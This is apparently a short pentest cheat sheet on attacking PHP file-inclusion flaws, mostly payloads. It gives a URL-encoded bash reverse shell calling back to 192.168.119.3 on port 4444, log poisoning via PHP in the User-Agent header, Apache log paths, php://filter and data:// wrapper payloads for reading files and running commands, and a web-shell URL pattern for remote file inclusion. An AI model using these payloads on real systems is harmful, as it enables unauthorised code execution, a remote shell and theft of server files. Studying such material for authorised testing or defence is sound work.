Main Idea: Can it interact with the file system?

### URL Encoded RevShell
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

CHANGE THE IP
```
### PHP code to allow commands
![[Pasted image 20240301133842.png]]
EMBED IN USER AGENT
### Location of Apache Log Files
```
Linux: /var/log/apache2/access.log
Windows: \xampp\apache\logs\access.log
```

### PHP Wrappers
Types of php://filter:
1. php://filter/resource={filename} (the basic one)
2. php://filter/convert.base64-encode/resource={filename} (encode output with base64)
Types of php://data:
1. data://text/plain,{whatever command you want to run} (the basic one)
2. data://text/plain;base64,{base64 code and whatever at the back} (encode the code into base64 before execution)

### Remote File Inclusion
within /usr/share/webshells/php, there is a file called simple-backdoor.php

type of usage: http://target.com/simple-backdoor.php?cmd={whatever command you want}